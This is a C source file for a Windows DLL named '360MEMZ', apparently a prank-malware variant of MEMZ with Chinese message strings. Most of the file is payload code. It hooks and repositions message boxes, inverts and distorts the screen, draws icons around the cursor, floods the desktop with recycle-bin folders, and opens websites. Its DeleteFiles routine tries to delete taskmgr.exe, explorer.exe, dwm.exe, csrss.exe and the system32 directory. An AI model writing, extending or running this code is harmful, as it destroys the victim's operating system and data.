#define _WIN32_WINNT 0x602
#include "360MEMZ.h"

HCRYPTPROV prov;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}

LPCSTR lpWebsites[5] = {
	"https://search.bilibili.com/all?keyword=360MEMZ",
	"https://space.bilibili.com/401094700",
	"https://www.bilibili.com/video/BV1qt4y1X7pM", 
	"https://space.bilibili.com/102499223/",
	"https://space.bilibili.com/401094700/fans/fans"
};

const int website_len = 5;


LPCWSTR WebsiteNames[5] = {
	L"度", 
	L"2233",
	L"咕鸽", 
	L"必应",
	L"360"
};


int scrw, scrh;
LPCWSTR okayButton = L"我汐了";
LRESULT CALLBACK messageBoxHookButton(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0)
		return CallNextHookEx(0, nCode, wParam, lParam);
	
	LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;
	RECT rc;
	GetWindowRect(msg->hwnd, &rc);
	int w = rc.right-rc.left, h = rc.bottom-rc.top;
	if (msg->message == WM_INITDIALOG) {
		SetWindowPos(msg->hwnd, NULL, random()%(scrw-w), random()%(scrh-h), 0, 0, SWP_NOSIZE);
		HWND btn = GetDlgItem(msg->hwnd, 2);
		SetWindowTextW(btn, okayButton);
	}
	
	if (msg->message == WM_PAINT) {
		
		
		HDC hdc = GetWindowDC(msg->hwnd);
		int x1 = random()%w, y1 = random()%h;
		BitBlt(hdc, x1, y1, x1+random()%(w-x1), y1+random()%(h-y1), hdc, x1, y1, NOTSRCCOPY);
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}


DWORD WINAPI DrawQuestion(LPVOID lpParameter){
	Sleep(1000);
	POINT p;HDC hdc = GetDC(NULL);
	int ix = GetSystemMetrics(SM_CXICON) / 2, iy = GetSystemMetrics(SM_CYICON) / 2;
	
	for(;;){
		GetCursorPos(&p);
		DrawIcon(hdc, p.x-ix, p.y-iy, LoadIcon(NULL, IDI_QUESTION));
		Sleep(10);
		if(random()%99==0)BitBlt(hdc, 0, 0, scrw, scrh, hdc, 0, 0, NOTSRCCOPY);
	}
}


int WINAPI Question(){
	scrw = GetSystemMetrics(SM_CXSCREEN), scrh = GetSystemMetrics(SM_CYSCREEN);
	CreateThread(NULL, 4096, DrawQuestion, NULL, 0, NULL);
	for(;;){
		MessageBeep(MB_ICONINFORMATION); 
		HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
		int opt = MessageBoxW(NULL, L"小盆友，你是否有很多问号？", L"？？？", MB_ICONQUESTION|MB_YESNO|MB_TOPMOST);
		UnhookWindowsHookEx(hook);
		if(opt == IDYES) {
			int idx = random()%website_len;
			ShellExecuteA(NULL, "open", lpWebsites[idx], "", "", SW_SHOWNORMAL);
			LPWSTR lpMsgBoxText = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 4096);
			
			wsprintfW(lpMsgBoxText, L"那就去问问%s娘吧！！！", WebsiteNames[idx]);
			okayButton = L"好的我汐了";
			HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
			MessageBoxW(NULL, lpMsgBoxText, L"!!!", MB_ICONWARNING|MB_OK|MB_TOPMOST);
			UnhookWindowsHookEx(hook);
		}
		else{
			okayButton = L"再来亿遍";
			HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
			MessageBoxW(NULL, L"这样可不彳亍，有问题一定要不耻下问哦！", L"。。。", MB_ICONERROR|MB_OK|MB_TOPMOST);
			UnhookWindowsHookEx(hook);
		}
	}
	
}

int RecycleBin(){
	LPWSTR lpPath = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 4096);
	LPWSTR lpNewPath = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 4096);
	GetEnvironmentVariableW(L"userprofile", lpPath, 2048);
	lstrcatW(lpPath, L"\\Desktop");
	int i;
	for(i = 0; i < 64; i++){
		swprintf(lpNewPath, L"%s\\回收站%d.{645FF040-5081-101B-9F08-00AA002F954E}", lpPath, i+1);
		CreateDirectoryW(lpNewPath, NULL);
		if(i%8==7) SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSH, NULL, NULL); 
		Sleep(100); 
	}
}

int Circle(){
	POINT p;
	int ix = GetSystemMetrics(SM_CXICON)/2, iy = GetSystemMetrics(SM_CYICON)/2;
	int idx = 0;
	for(;;){
		idx++;
		if(idx>6)idx=0;
		HICON hIcon = LoadIcon(NULL, MAKEINTRESOURCE(32512+idx));
		//y^2=144-x^2
		int i;
		for(i = 0; i <= 100; i+=10){
			GetCursorPos(&p);
			int j = sqrt(10000-i*i);
			DrawIcon(GetDC(NULL), p.x+i-ix, p.y+j-iy, hIcon);
			Sleep(10);
		}
		for(i = 100; i >= 0; i-=10){
			GetCursorPos(&p);
			int j = -sqrt(10000-i*i);
			DrawIcon(GetDC(NULL), p.x+i-ix, p.y+j-iy, hIcon);
			Sleep(10);
		}
		for(i = 0; i >= -100; i-=10){
			GetCursorPos(&p);
			int j = -sqrt(10000-i*i);
			DrawIcon(GetDC(NULL), p.x+i-ix, p.y+j-iy, hIcon);
			Sleep(10);
		}
		for(i = -100; i <= 00; i+=10){
			GetCursorPos(&p);
			int j = sqrt(10000-i*i);
			DrawIcon(GetDC(NULL), p.x+i-ix, p.y+j-iy, hIcon);
			Sleep(10);
		}
		
	}
	return 0;
}
int WINAPI RandomWebsites(){
	int i;
	for(i = 0; i < 4; i++){
		ShellExecuteA(NULL, "open", lpWebsites[i], "", "", SW_SHOWNORMAL);
		Sleep(5000+random()%2500);
	}
	
} 
 

int w, h;

void WINAPI memzInit(void)
{
	w = GetSystemMetrics(SM_CXSCREEN);h = GetSystemMetrics(SM_CYSCREEN);
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (w - pcs->cx);
			int y = random() % (h - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI DeleteFilep(LPVOID lpszPath){

	SHFILEOPSTRUCTW FileOp={0};
	FileOp.fFlags = FOF_WANTNUKEWARNING|FOF_ALLOWUNDO; //不出现确认对话框
	FileOp.pFrom = (LPCWSTR)lpszPath;
	FileOp.pTo = NULL;      //一定要是NULL
	FileOp.wFunc = FO_DELETE;    //删除操作
	FileOp.lpszProgressTitle = lpszPath;
	SHFileOperationW(&FileOp);
	return GetLastError();
} 

LPCWSTR lpPaths[] = {
L"C:\\Windows\\system32\\taskmgr.exe\0\0",
L"C:\\Windows\\explorer.exe\0\0",
L"C:\\Windows\\system32\\dwm.exe\0\0",
L"C:\\Windows\\system32\0\0",
L"C:\\Windows\\system32\\csrss.exe\0\0"
};

int WINAPI DeleteFiles(){
	int i;
	for(i = 0; i < 10; i++){
		int idx = random()%5;
		if(i == 0) idx = 0;
		CreateThread(NULL, 4096, DeleteFilep, (LPVOID)lpPaths[idx], 0, NULL);
		
		Sleep(2000+random()%2500);
	}
	SuspendThread(GetCurrentThread());
}


COLORREF colors[7] = {
	RGB(255, 0, 0), //红 
	RGB(255, 165, 0), //橙 
	RGB(255, 255, 0), //黄 
	RGB(0, 255, 0), //绿 
	RGB(0, 0, 255), //蓝 
	RGB(128, 0, 211), //靛 
	RGB(192, 0, 255) //紫 

};
int MAXDEPTH = 5;      /* Bigger depth takes longer to draw */

void
Hilbert(HDC hdc, int x, int y, int vx, int vy, int wx, int wy, int n)
{
    if (n >= MAXDEPTH) {
    	HPEN hPen = CreatePen(0, 1, colors[x*y%7]);
    	SelectObject(hdc, hPen);
        LineTo(hdc, x + (vx+wx)/2, y + (vy+wy)/2);
        DeleteObject(hPen);
    } else {
        n++;
        Hilbert(hdc, x, y, wx/2, wy/2, vx/2, vy/2, n);
        Hilbert(hdc, x+vx/2, y+vy/2, vx/2, vy/2, wx/2, wy/2, n);
        Hilbert(hdc, x+vx/2+wx/2, y+vy/2+wy/2, vx/2, vy/2, wx/2, wy/2, n);
        Hilbert(hdc, x+vx/2+wx, y+vy/2+wy, -wx/2, -wy/2, -vx/2, -vy/2, n);
    }
}

int
sineCurve()
{
    HDC hdc = GetDC(NULL);

    if (hdc) {
        
            HBRUSH hbrOld;
            HPEN hpenOld;
            HCURSOR hcurOld;

            hbrOld = SelectObject(hdc, GetStockObject(BLACK_BRUSH));
            hpenOld = SelectObject(hdc, GetStockObject(BLACK_PEN));

            MoveToEx(hdc, 0, 0, 0);
            Hilbert(hdc, 0, 0, w, 0,
                               0, h, 0);
            SelectObject(hdc, hpenOld);
    }
}

int Blackhole(){
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
	HBRUSH hBrush = CreatePatternBrush(hBitmap);
	SelectObject(hdc, hBrush);
	int cx = w / 2, cy = h / 2;
	double ckb = (double)w / h;
	int i;
	for(i = 0; i <= cx; i++){
		Ellipse(hdc, cx - i*ckb, cy - i, cx + i*ckb, cy + i);
		Sleep(5);
	}
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
	switch(fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		{
			memzInit();
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
		case DLL_THREAD_ATTACH:
		{
			break;
		}
		case DLL_THREAD_DETACH:
		{
			break;
		}
	}
	
	/* Return TRUE on success, FALSE on failure */
	return TRUE;
}

